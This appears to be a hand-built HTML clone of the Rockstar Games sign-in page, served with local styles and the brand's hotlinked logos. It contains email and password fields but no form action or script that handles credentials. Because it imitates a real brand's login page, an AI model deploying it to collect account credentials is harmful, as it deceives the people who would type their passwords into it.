<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In - Rockstar Games</title>
    <link rel="shortcut icon" href="icons/rockstar.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="page">
    <main class>
        <div class="app-body-content">
            <div class="logo">
                <a href="https://www.rockstargames.com?redirect_lang=us" class="logo__logo-link">
                    <img src="https://s.rsg.sc/auth/images/logo_20231030.svg" alt="Rockstar logo">
                </a>
            </div>
            <div class="login">
                <div class="login__user-form">
                    <h1>Sign in</h1>
                    <div>
                        <div>
                            <form class="login__form">
                                <fieldset class="form__fieldset-email">
                                    <span class="fieldset__input">
                                        <input class="text-input" id="text-input" autocomplete="on" name="email"
                                               placeholder="" type="email" maxlength="254">
                                            <label for="text-input" class="text-input__label">
                                                <span>Email</span>
                                            </label>
                                    </span>
                                </fieldset>
                                <fieldset class="form__fieldset-password">
                                    <span class="fieldset-password__password-input-container">
                                        <span class="fieldset__input">
                                            <input class="text-input" id="text-input-password" type="password" placeholder="">
                                            <label for="text-input-password" class="text-input__label">
                                                <span>Password</span>
                                            </label>
                                            </span>
                                            <button class="password-input__password-buttom">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" height="16" width="16" class="password-buttom__icon" data-ui-name="visibility_off_icon" aria-hidden="false"><path d="M29.8 17.2c-2.2 1.7-4.6 3-7.1 3.7l-2.5-2.5c.6-.8.9-1.8.9-2.9 0-1.4-.5-2.6-1.5-3.6-1.7-1.7-4.5-1.9-6.4-.6l-1.7-1.7c6.3-1.3 12.9.1 18.4 4.3.6.5 1.5.4 1.9-.2.5-.6.4-1.5-.2-1.9-6.7-5.1-14.9-6.6-22.4-4.4L5.7 3.9c-.5-.5-1.4-.5-1.9 0s-.5 1.4 0 1.9l2.6 2.6c-2 .9-4 2-5.8 3.4-.6.5-.7 1.3-.2 1.9.3.3.7.5 1.1.5.3 0 .6-.1.8-.3 1.9-1.5 4-2.6 6.2-3.4l2.9 2.9c-.3.6-.4 1.2-.4 1.8 0 .8.5 1.4 1.3 1.5.6.1 1.2-.4 1.4-1l2.2 2.2c-.2 0-.3 0-.5-.1-.7-.2-1.5.2-1.7.9-.2.7.2 1.5.9 1.7.5.2 1 .2 1.5.2.7 0 1.4-.2 2.1-.5l1.5 1.5c-6 1-12.2-.5-17.3-4.5-.6-.5-1.5-.4-1.9.2-.5.6-.4 1.5.2 1.9 4.6 3.6 10 5.4 15.5 5.4 2 0 3.9-.2 5.9-.7l4.1 4.1c.3.3.6.4 1 .4s.7-.1 1-.4c.5-.5.5-1.4 0-1.9L25.1 23c2.3-.9 4.6-2.1 6.6-3.7.6-.5.7-1.3.2-1.9-.7-.6-1.5-.7-2.1-.2zm-12.2-3.3c.4.4.7 1 .7 1.7 0 .3-.1.6-.2.8l-3-3c.9-.3 1.9-.1 2.5.5z"></path>
                                                </svg>
                                            </button>
                                         </span>
                                    <div class="loginform__keep-Me-Signe-dIn-container">
                                        <span class="login-form__checkbox">
                                            <span class="loginform__checkbox__uLZu8 UI__CheckBox-socialclub__wrapper">
                                                <input type="checkbox" id="box" name="keepMeSignedIn" class="checkbox" data-ui-name="keepMeSignedIn" value="">
                                                <label for="box">Keep me signed in</label>
                                            </span>
                                        </span>
                                    </div>
                                </fieldset>
                                <fieldset class="loginform__submit-field">
                                    <div class="loginform__submit-action">
                                        <p>
                                            <a class="loginform__link__Zf4mD loginform__forgotPassword__P5Rqh" data-ui-name="forgotPasswordLink" href="/forgotten-password?cid=rsg">Forgot your password?</a>
                                        </p>
                                        <button aria-disabled="false" class="UI__Button-socialclub__btn UI__Button-socialclub__primary UI__Button-socialclub__medium loginform__submit__rf6YG" data-ui-name="signInButton" type="submit">
                                            <div style="">
                                                <span>Sign in</span>
                                            </div>
                                        </button>
                                    </div>
                                </fieldset>
                            </form>
                        </div>
                    </div>
                </div>
                <div class="sign-in-using-container">
                    <fieldset class="Login__thirdParty">
                        <div class="UI__ThirdPartyAuth__wrap">
                            <p class="UI__ThirdPartyAuth__label">Sign in using</p>
                            <div class="UI__ThirdPartyAuth__services">
                                <a class="ThirdPartyAuthProvider__link__MzR1g Login__tpaIcon__y8rcv" data-ui-name="npSignInLink" href="/tpa/np/login?cid=rsg&amp;returnUrl=%2F" rel="" target="_self">
                                    <img alt="np icon" class="ThirdPartyIcon__icon__pOdjC" data-ui-name="npIcon" src="https://s.rsg.sc/auth/images/icons/colored/np.svg">
                                </a>
                                <a class="ThirdPartyAuthProvider__link__MzR1g Login__tpaIcon__y8rcv" data-ui-name="xblSignInLink" href="/tpa/xbl/login?cid=rsg&amp;returnUrl=%2F" rel="" target="_self">
                                    <img alt="xbl icon" class="ThirdPartyIcon__icon__pOdjC" data-ui-name="xblIcon" src="https://s.rsg.sc/auth/images/icons/colored/xbl.svg">
                                </a>
                            </div>
                        </div>
                    </fieldset>
                    <div>
                        <p class="login-create-link">
                            Don't have a Rockstar Games account?
                            <a class="undefined Login__loginStatusNavLink__lq_aC" href="/create?cid=rsg">Create a new account</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <footer>
        <ul class="AppBody__infoList__EZ3F9">
            <li class="AppBody__info__TxE07" data-ui-name="copyright">
                © 2026 Rockstar Games</li>
            <li class="AppBody__info__TxE07">
                <button aria-disabled="false" class="AppBody__footerPolicyButton__WIWmO" data-policy="pp" data-ui-name="privacyPolicyLink" type="button">Privacy Policy</button>
            </li>
            <li class="AppBody__info__TxE07"><button aria-disabled="false" class="AppBody__footerPolicyButton__WIWmO" data-policy="tos" data-ui-name="termsOfServiceLink" type="button">Terms Of Service</button>
            </li>
            <li class="AppBody__info__TxE07"><button aria-disabled="false" class="AppBody__footerPolicyButton__WIWmO" data-ui-name="cookieSettingsButton" type="button">Cookie Settings</button>
            </li>
        </ul>
    </footer>
</div>
</body>
</html>
